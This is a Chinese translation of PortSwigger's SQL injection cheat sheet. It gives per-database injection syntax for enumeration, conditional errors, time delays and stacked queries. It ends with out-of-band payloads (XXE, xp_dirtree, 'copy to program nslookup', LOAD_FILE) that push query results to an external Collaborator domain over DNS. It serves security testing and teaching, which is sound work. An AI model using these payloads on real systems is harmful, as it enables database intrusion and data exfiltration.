---
description: '原文链接：https://portswigger.net/web-security/sql-injection/cheat-sheet'
---

# SQL注入备忘单

这个SQL注入备忘单包含了一些有用的语法例子，您可以用来执行执行SQL注入攻击时经常出现的各种任务。

### 字符串连接

你可以将多个字符串连接在一起组成一个字符串。

| DataBases | Statements |
| :--- | :--- |
| **Oracle** | `'foo'||'bar'` |
| **Microsoft** | `'foo'+'bar'` |
| **PostgreSQL** | `'foo'||'bar'` |
| **MySQL** | `'foo' 'bar'` \[Note the space between the two strings\] `CONCAT('foo','bar')` |

### 子字符串

您可以从指定的偏移量中提取字符串的部分长度。请注意，偏移量的索引是基于1的。以下每个表达式都会返回字符串 ba。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

### 注释

您可以使用注释来截断查询，并删除输入之后的原始查询部分。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `--comment` |
| Microsoft | `--comment` `/*comment*/` |
| PostgreSQL | `--comment` `/*comment*/` |
| MySQL | `#comment` `-- comment` \[Note the space after the double dash\] `/*comment*/` |

### 数据库版本

你可以查询数据库以确定其类型和版本。这些信息在制定更复杂的攻击时很有用。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT banner FROM v$version SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

### 数据库内容

您可以列出数据库中存在的表，以及这些表包含的列。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft | `SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### 条件错误

您可以测试单个布尔条件，如果条件为真，则触发数据库错误。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### 批处理（或堆叠）查询

您可以使用批处理查询来连续执行多个查询。请注意，虽然后续查询被执行，但结果不会返回给应用程序。因此，这种技术主要用于与盲目漏洞有关的情况，在这种情况下，您可以使用第二个查询来触发一个 DNS 查找、条件错误或时间延迟。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `Does not support batched queries.` |
| Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL | `QUERY-1-HERE; QUERY-2-HERE` |

> Note
>
> 对于MySQL，批量查询通常不能用于SQL注入。然而，如果目标应用程序使用某些PHP或Python API与MySQL数据库通信，这偶尔是可能的。

### 时间延迟

您可以在数据库处理查询时造成时间延迟。以下将造成10秒的无条件时间延迟。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT sleep(10)` |

### 有条件的时间延迟

你可以测试一个布尔条件，如果条件为真，就会触发一个时间延迟。

| DataBases | Statements |
| :--- | :--- |
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |

### DNS查找

您可以使数据库执行对外部域的 DNS 查找。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以确认发生了 DNS 查找。

| DataBases | Statements |
| :--- | :--- |
| Oracle | The following technique leverages an XML external entity \([XXE](https://portswigger.net/web-security/xxe)\) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
| Microsoft | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'` |
| MySQL | The following techniques work on Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |

### 带数据渗出的DNS查找

您可以使数据库对包含注入查询结果的外部域进行 DNS 查询。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的细节，包括被渗出的数据。

<table>
  <thead>
    <tr>
      <th style="text-align:left">DataBases</th>
      <th style="text-align:left">Statements</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Oracle</td>
      <td style="text-align:left"><code>SELECT extractvalue(xmltype(&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&apos;||(SELECT YOUR-QUERY-HERE)||&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&apos;),&apos;/l&apos;) FROM dual</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Microsoft</td>
      <td style="text-align:left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&apos;master..xp_dirtree &quot;//&apos;+@p+&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&apos;)</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">PostgreSQL</td>
      <td style="text-align:left">
        <p><code>create OR replace function f() returns void as $$</code>
        </p>
        <p><code>declare c text; </code>
        </p>
        <p><code>declare p text; </code>
        </p>
        <p><code>begin </code>
        </p>
        <p><code>SELECT into p (SELECT YOUR-QUERY-HERE); </code>
        </p>
        <p><code>c := &apos;copy (SELECT &apos;&apos;&apos;&apos;) to program &apos;&apos;nslookup &apos;||p||&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&apos;&apos;&apos;; </code>
        </p>
        <p><code>execute c; </code>
        </p>
        <p><code>END;</code>
        </p>
        <p><code>$$  language plpgsql security definer; </code>
        </p>
        <p><code>SELECT f();</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">MySQL</td>
      <td style="text-align:left">The following technique works on Windows only:
        <br /><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &apos;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&apos;</code>
      </td>
    </tr>
  </tbody>
</table>







